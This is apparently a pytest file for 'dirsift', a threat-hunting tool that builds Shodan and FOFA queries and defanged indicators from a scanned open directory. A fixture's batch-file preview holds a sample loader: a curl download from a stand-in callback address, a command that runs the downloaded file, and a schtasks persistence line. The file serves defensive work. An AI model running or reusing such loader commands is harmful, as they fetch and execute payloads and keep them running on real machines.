"""Queries for the sibling hosts, written from a saved run and never run.

Every expected query is asserted letter for letter: a query with the wrong
quote returns nothing, and nothing reads as "no siblings".
"""

from __future__ import annotations

import base64
from pathlib import Path
from urllib.parse import parse_qs, quote, unquote, urlparse

from typer.testing import CliRunner

from dirsift import cli
from dirsift.analyze import analyze
from dirsift.asn import AsnTable
from dirsift.models import Entry, ScanResult
from dirsift.pivots import (
    build_pivots,
    pivot_notes,
    render_pivots_markdown,
    render_pivots_plain,
    select,
)

runner = CliRunner()

AT_ROOT = "http://203.0.113.24:8080/"
BELOW = "http://203.0.113.24:8080/files/"
TITLE = "Index of /"
SERVER = "Apache/2.4.41 (Ubuntu)"
CALLBACK_IP = "198.51.100.77"
CALLBACK_HOST = "cdn.panel-gate.xyz"


def entry(root: str, path: str, **kw) -> Entry:
    folder, _, name = path.rpartition("/")
    defaults = {"kind": "pe", "fetched_bytes": 4096, "depth": path.count("/") + 1}
    defaults.update(kw)
    return Entry(
        url=root + path,
        name=name,
        parent_url=root + (folder + "/" if folder else ""),
        **defaults,
    )


def kit(root: str) -> list[Entry]:
    """A staged kit: a loader, a build family, a lying extension, and noise."""
    return [
        entry(
            root,
            "install_svc.bat",
            kind="script",
            fetched_bytes=200,
            text_preview=(
                "curl -o svcrun4.exe http://" + CALLBACK_IP + ":8443/svcrun4.exe\n"
                "start svcrun4.exe\nschtasks /create /tn upd /tr svcrun3.exe\n"
                "ping " + CALLBACK_HOST + "\nrem 10.0.0.5 is the old box\n"
            ),
        ),
        entry(root, "svcrun3.exe"),
        entry(root, "svcrun4.exe"),
        entry(root, "invoice_march.pdf", kind="pe", confidence="sniffed", magic="DOS/PE"),
        # Generic names that would otherwise qualify: a page naming the builds,
        # and a file whose bytes contradict its extension.
        entry(root, "index.html", kind="web", text_preview="svcrun3.exe svcrun4.exe"),
        entry(root, "setup.exe", kind="document", confidence="sniffed", magic="PDF"),
    ]


def run(root: str = AT_ROOT, entries: list[Entry] | None = None, **kw):
    defaults = {"title": TITLE, "server": SERVER, "listing_flavor": "apache"}
    defaults.update(kw)
    listed = kit(root) if entries is None else entries
    result = ScanResult(root_url=root, entries=listed, **defaults)
    return analyze(result, asn_table=AsnTable())


def queries(result_and_candidates, engine: str | None = None, basis: str | None = None):
    pivots = build_pivots(*result_and_candidates)
    return [
        p.query
        for p in pivots
        if (engine is None or p.engine == engine) and (basis is None or p.basis == basis)
    ]


def pivot(result_and_candidates, engine: str, query: str):
    matches = [
        p
        for p in build_pivots(*result_and_candidates)
        if p.engine == engine and p.query == query
    ]
    assert matches, f"no {engine} pivot {query!r}"
    return matches[0]


# -- the listing ---------------------------------------------------------------


def test_a_listing_at_the_root_gives_a_title_server_and_port_pivot():
    loaded = run()
    shodan = 'http.title:"Index of /" "Server: Apache/2.4.41 (Ubuntu)" port:8080'
    fofa = 'title="Index of /" && server="Apache/2.4.41 (Ubuntu)" && port="8080"'
    assert pivot(loaded, "shodan", shodan).strength == "medium"
    assert pivot(loaded, "fofa", fofa).strength == "medium"
    assert pivot(loaded, "shodan", 'http.title:"Index of /"').strength == "broad"
    assert pivot(loaded, "fofa", 'title="Index of /"').strength == "broad"


def test_an_https_root_without_a_port_is_port_443():
    loaded = run("https://files.example-staging.xyz/")
    assert 'http.title:"Index of /" "Server: Apache/2.4.41 (Ubuntu)" port:443' in queries(
        loaded, "shodan"
    )
    assert 'title="Index of /" && server="Apache/2.4.41 (Ubuntu)" && port="443"' in queries(
        loaded, "fofa"
    )


def test_a_title_that_needs_escaping_is_skipped_and_said():
    loaded = run(title='Index of "/"')
    assert not [q for q in queries(loaded) if "Index of" in q]
    assert any("skipped, value needs escaping" in note for note in pivot_notes(*loaded))


# -- urls ----------------------------------------------------------------------


def test_the_shodan_url_is_the_query_percent_encoded():
    loaded = run()
    query = 'http.title:"Index of /"'
    found = pivot(loaded, "shodan", query)
    assert found.url == "https://www.shodan.io/search?query=" + quote(query, safe="")
    assert found.url == (
        "https://www.shodan.io/search?query=http.title%3A%22Index%20of%20%2F%22"
    )


def test_the_fofa_url_decodes_back_to_the_query():
    loaded = run()
    query = 'title="Index of /" && server="Apache/2.4.41 (Ubuntu)" && port="8080"'
    found = pivot(loaded, "fofa", query)
    encoded = parse_qs(urlparse(found.url).query)["qbase64"][0]
    assert base64.b64decode(encoded).decode("utf-8") == query
    assert found.url.startswith("https://en.fofa.info/result?qbase64=")
    assert unquote(found.url.split("=", 1)[1]) == encoded


# -- the engines only index the root of a port -----------------------------------


def test_a_listing_below_the_root_is_marked_and_demoted():
    loaded = run(BELOW)
    title = pivot(loaded, "shodan", 'http.title:"Index of /"')
    combined = pivot(
        loaded, "fofa", 'title="Index of /" && server="Apache/2.4.41 (Ubuntu)" && port="8080"'
    )
    for found, expected in ((title, "broad"), (combined, "broad")):
        assert found.indexed_path_mismatch
        assert found.strength == expected
        assert "root page" in found.reason
        assert "/files/" in found.reason


def test_a_listing_below_the_root_adds_a_guess_at_the_root_title():
    loaded = run(BELOW, title="Index of /files")
    guess = pivot(loaded, "shodan", 'http.title:"Index of /"')
    assert not guess.indexed_path_mismatch
    assert guess.strength == "broad"
    assert "assum" in guess.reason.lower()
    assert pivot(loaded, "fofa", 'title="Index of /"')


def test_a_python_listing_guesses_its_own_root_title():
    loaded = run(BELOW, title="Directory listing for /files/", listing_flavor="python")
    assert pivot(loaded, "shodan", 'http.title:"Directory listing for /"')
    assert pivot(loaded, "fofa", 'title="Directory listing for /"')


def test_a_listing_at_the_root_adds_no_guess():
    loaded = run(title="Index of /")
    titles = [p for p in build_pivots(*loaded) if p.basis == "title" and "assum" in p.reason]
    assert titles == []


# -- the Server header -----------------------------------------------------------


def test_the_server_header_in_both_engines():
    loaded = run()
    assert pivot(loaded, "shodan", '"Server: Apache/2.4.41 (Ubuntu)"').strength == "medium"
    assert pivot(loaded, "fofa", 'server="Apache/2.4.41 (Ubuntu)"').strength == "medium"
    exact = pivot(loaded, "fofa", 'server=="Apache/2.4.41 (Ubuntu)" && port="8080"')
    assert exact.strength == "narrow"
    assert not any("http.server" in q for q in queries(loaded))


def test_a_server_without_a_version_is_broad():
    loaded = run(server="nginx")
    assert pivot(loaded, "shodan", '"Server: nginx"').strength == "broad"
    assert pivot(loaded, "fofa", 'server="nginx"').strength == "broad"


def test_server_pivots_ignore_where_the_listing_sits():
    loaded = run(BELOW)
    found = pivot(loaded, "fofa", 'server=="Apache/2.4.41 (Ubuntu)" && port="8080"')
    assert not found.indexed_path_mismatch
    assert found.strength == "narrow"


# -- file names ----------------------------------------------------------------


def test_the_driver_a_family_member_and_a_lying_extension_become_pivots():
    loaded = run()
    assert pivot(loaded, "shodan", 'http.html:"install_svc.bat"').basis == "filename"
    assert pivot(loaded, "fofa", 'body="install_svc.bat"').strength == "medium"
    assert pivot(loaded, "shodan", 'http.html:"svcrun3.exe"').basis == "family"
    assert pivot(loaded, "fofa", 'body="invoice_march.pdf"').basis == "filename"
    assert "may be missed on very long listings" in pivot(
        loaded, "fofa", 'body="install_svc.bat"'
    ).reason


def test_generic_names_are_dropped_and_counted():
    loaded = run()
    everything = " ".join(queries(loaded))
    assert "index.html" not in everything
    assert "setup.exe" not in everything
    assert any(
        "2 generic file names" in note for note in pivot_notes(*loaded)
    ), pivot_notes(*loaded)


def test_two_names_from_one_folder_make_a_narrow_pivot():
    loaded = run()
    shodan = pivot(loaded, "shodan", 'http.html:"install_svc.bat" http.html:"svcrun3.exe"')
    fofa = pivot(loaded, "fofa", 'body="install_svc.bat" && body="svcrun3.exe"')
    assert shodan.strength == fofa.strength == "narrow"
    assert shodan.sources == ["install_svc.bat", "svcrun3.exe"]


def test_names_below_the_root_are_marked_and_demoted():
    loaded = run(BELOW)
    single = pivot(loaded, "shodan", 'http.html:"install_svc.bat"')
    pair = pivot(loaded, "fofa", 'body="install_svc.bat" && body="svcrun3.exe"')
    assert single.indexed_path_mismatch and single.strength == "broad"
    assert pair.indexed_path_mismatch and pair.strength == "medium"


def test_a_name_in_a_subfolder_of_a_root_listing_is_marked_too():
    """The root page lists bin/, not what is inside it."""
    hidden = entry(AT_ROOT, "bin/loader_x64.txt", kind="pe", confidence="sniffed")
    found = pivot(run(entries=kit(AT_ROOT) + [hidden]), "shodan", 'http.html:"loader_x64.txt"')
    assert found.indexed_path_mismatch
    assert "/bin/" in found.reason


def test_non_ascii_names_survive_the_query_and_the_url():
    name = "ödeme_отчет.pdf"
    entries = kit(AT_ROOT) + [entry(AT_ROOT, name, kind="pe", confidence="sniffed")]
    loaded = run(entries=entries)
    shodan = pivot(loaded, "shodan", f'http.html:"{name}"')
    assert unquote(shodan.url.split("query=", 1)[1]) == f'http.html:"{name}"'
    fofa = pivot(loaded, "fofa", f'body="{name}"')
    encoded = parse_qs(urlparse(fofa.url).query)["qbase64"][0]
    assert base64.b64decode(encoded).decode("utf-8") == f'body="{name}"'


# -- the network, the host and its neighbours -------------------------------------


def test_a_known_network_narrows_the_title_and_port():
    loaded = run(target_ip="203.0.113.24", target_asn=14061)
    shodan = pivot(loaded, "shodan", 'asn:AS14061 port:8080 http.title:"Index of /"')
    fofa = pivot(loaded, "fofa", 'asn="14061" && port="8080" && title="Index of /"')
    assert shodan.strength == fofa.strength == "narrow"
    assert shodan.basis == "network"


def test_no_network_means_no_network_pivot_and_a_note_saying_why():
    loaded = run(target_ip="203.0.113.24")
    assert not [q for q in queries(loaded) if "asn" in q]
    assert any("address table" in note for note in pivot_notes(*loaded))


def test_the_same_host_and_its_neighbourhood():
    loaded = run(target_ip="203.0.113.24")
    assert pivot(loaded, "shodan", "net:203.0.113.24/32").basis == "host"
    assert pivot(loaded, "fofa", 'ip="203.0.113.24"').strength == "medium"
    shodan = pivot(loaded, "shodan", "net:203.0.113.0/24")
    fofa = pivot(loaded, "fofa", 'ip="203.0.113.0/24"')
    assert shodan.basis == fofa.basis == "neighbourhood"
    assert shodan.strength == "broad"
    assert "noisy" in shodan.reason


def test_a_private_target_gets_no_neighbourhood():
    loaded = run("http://10.0.0.5:8080/", target_ip="10.0.0.5")
    assert not [q for q in queries(loaded) if "/24" in q]


def test_a_named_host_gets_a_hostname_pivot_and_an_address_does_not():
    named = run("http://files.example-staging.xyz:8080/")
    assert pivot(named, "shodan", 'hostname:"files.example-staging.xyz"').strength == "medium"
    assert pivot(named, "fofa", 'host="files.example-staging.xyz"').basis == "host"
    assert not [q for q in queries(run(), basis="host") if "hostname" in q or "host=" in q]


# -- indicators ------------------------------------------------------------------


def test_indicators_become_address_and_host_pivots():
    loaded = run()
    assert pivot(loaded, "shodan", f"net:{CALLBACK_IP}/32").basis == "indicator"
    assert pivot(loaded, "fofa", f'ip="{CALLBACK_IP}"').basis == "indicator"
    assert pivot(loaded, "shodan", f'hostname:"{CALLBACK_HOST}"').basis == "indicator"
    assert pivot(loaded, "fofa", f'host="{CALLBACK_HOST}"').basis == "indicator"
    assert not any("domain=" in q for q in queries(loaded))


def test_a_private_indicator_is_skipped_and_counted():
    loaded = run()
    assert not [q for q in queries(loaded) if "10.0.0.5" in q]
    assert any("1 private address" in note for note in pivot_notes(*loaded))


# -- the page and the pipe ------------------------------------------------------


def markdown_of(loaded) -> str:
    result, candidates = loaded
    return render_pivots_markdown(
        build_pivots(result, candidates), result, pivot_notes(result, candidates)
    )


def test_indicators_are_defanged_on_the_page_and_nowhere_live():
    page = markdown_of(run(target_ip="203.0.113.24"))
    assert "net:198[.]51[.]100[.]77/32" in page
    assert 'host="cdn[.]panel-gate[.]xyz"' in page
    assert "Defanged on purpose" in page
    for live in (CALLBACK_IP, CALLBACK_HOST, "panel-gate.xyz"):
        assert live not in page


def test_the_page_warns_when_the_listing_is_below_the_root():
    page = markdown_of(run(BELOW))
    before_queries = page.split("\n## ")[0]
    assert "not at the root of its port" in before_queries
    assert "/files/" in before_queries
    assert "not at the root" not in markdown_of(run())


def test_the_page_groups_by_strength_and_skips_empty_groups():
    page = markdown_of(run(target_ip="203.0.113.24", target_asn=14061))
    assert page.index("## Narrow") < page.index("## Medium") < page.index("## Broad")
    bare = ScanResult(root_url="http://10.0.0.5:8080/", title=TITLE)
    page = markdown_of(analyze(bare, asn_table=AsnTable()))
    assert "## Narrow" not in page and "## Medium" not in page
    assert "## Broad" in page


def test_the_same_run_gives_the_same_bytes_and_no_repeats():
    first = markdown_of(run(target_ip="203.0.113.24", target_asn=14061))
    second = markdown_of(run(target_ip="203.0.113.24", target_asn=14061))
    assert first == second
    pivots = build_pivots(*run(target_ip="203.0.113.24", target_asn=14061))
    keys = [(p.engine, p.query) for p in pivots]
    assert len(keys) == len(set(keys))


def test_the_pipe_leaves_indicators_out_unless_asked_for_live_values():
    pivots = build_pivots(*run())
    quiet = render_pivots_plain(pivots)
    assert CALLBACK_IP not in quiet and "198[.]51" not in quiet
    live = render_pivots_plain(pivots, fanged=True)
    assert f"shodan\tnet:{CALLBACK_IP}/32" in live.splitlines()
    assert f'fofa\thost="{CALLBACK_HOST}"' in live.splitlines()


def test_select_by_engine_and_strength():
    pivots = build_pivots(*run(target_ip="203.0.113.24", target_asn=14061))
    narrow_shodan = select(pivots, engine="shodan", strength="narrow")
    assert narrow_shodan
    assert {(p.engine, p.strength) for p in narrow_shodan} == {("shodan", "narrow")}
    medium_up = select(pivots, strength="medium")
    assert {p.strength for p in medium_up} == {"narrow", "medium"}
    assert len(select(pivots, strength="broad")) == len(pivots)


# -- the command -----------------------------------------------------------------


def saved(tmp_path: Path, root: str = AT_ROOT, **kw) -> Path:
    result, _ = run(root, **kw)
    path = tmp_path / "run.json"
    path.write_text(result.model_dump_json(indent=2), encoding="utf-8")
    return path


def test_pivots_prints_the_page(tmp_path: Path, monkeypatch):
    monkeypatch.delenv("DIRSIFT_NO_BANNER", raising=False)
    reply = runner.invoke(cli.app, ["pivots", str(saved(tmp_path, target_ip="203.0.113.24"))])
    assert reply.exit_code == 0, reply.stdout
    assert reply.stdout.startswith("# Pivots: ")
    assert "someoneleftthelightson" in reply.stderr.replace(" ", "")
    assert CALLBACK_IP not in reply.stdout


def test_pivots_plain_is_one_query_per_line_and_nothing_else(tmp_path: Path, monkeypatch):
    monkeypatch.delenv("DIRSIFT_NO_BANNER", raising=False)
    reply = runner.invoke(
        cli.app, ["pivots", str(saved(tmp_path)), "--plain", "-e", "shodan", "-s", "narrow"]
    )
    assert reply.exit_code == 0
    assert reply.stderr == ""
    lines = reply.stdout.splitlines()
    assert 'http.html:"install_svc.bat" http.html:"svcrun3.exe"' in lines
    assert all("\t" not in line for line in lines)
    assert all(not line.startswith(("#", "-")) for line in lines)


def test_pivots_plain_with_fanged_prints_live_indicators(tmp_path: Path):
    run_file = saved(tmp_path)
    quiet = runner.invoke(cli.app, ["pivots", str(run_file), "--plain"])
    live = runner.invoke(cli.app, ["pivots", str(run_file), "--plain", "--fanged"])
    assert CALLBACK_IP not in quiet.stdout
    assert f"shodan\tnet:{CALLBACK_IP}/32" in live.stdout.splitlines()


def test_pivots_writes_the_page_as_utf8(tmp_path: Path):
    name = "ödeme_отчет.pdf"
    entries = kit(AT_ROOT) + [entry(AT_ROOT, name, kind="pe", confidence="sniffed")]
    run_file = saved(tmp_path, entries=entries)
    out = tmp_path / "out" / "pivots.md"
    reply = runner.invoke(cli.app, ["pivots", str(run_file), "-o", str(out)])
    assert reply.exit_code == 0, reply.stdout
    assert f'body="{name}"' in out.read_text(encoding="utf-8")


def test_an_unknown_engine_or_strength_is_a_sentence(tmp_path: Path):
    run_file = saved(tmp_path)
    for flag, value in (("-e", "censys"), ("-s", "tiny")):
        reply = runner.invoke(cli.app, ["pivots", str(run_file), flag, value])
        assert reply.exit_code == 2
        assert value in reply.stdout
        assert "Traceback" not in reply.stdout


def test_a_missing_run_is_a_sentence_for_pivots_too(tmp_path: Path):
    reply = runner.invoke(cli.app, ["pivots", str(tmp_path / "nope.json")])
    assert reply.exit_code == 2
    assert "nope.json" in reply.stdout


def test_pivots_never_opens_a_connection(tmp_path: Path, monkeypatch):
    import httpx

    class NoNetwork:
        def __init__(self, *args, **kwargs):
            raise AssertionError("pivots tried to open an HTTP client")

    monkeypatch.setattr(httpx, "Client", NoNetwork)
    monkeypatch.setattr(httpx, "AsyncClient", NoNetwork)
    run_file = saved(tmp_path, target_ip="203.0.113.24", target_asn=14061)
    for extra in ([], ["--plain", "--fanged"]):
        reply = runner.invoke(cli.app, ["pivots", str(run_file), *extra])
        assert reply.exit_code == 0, reply.stdout
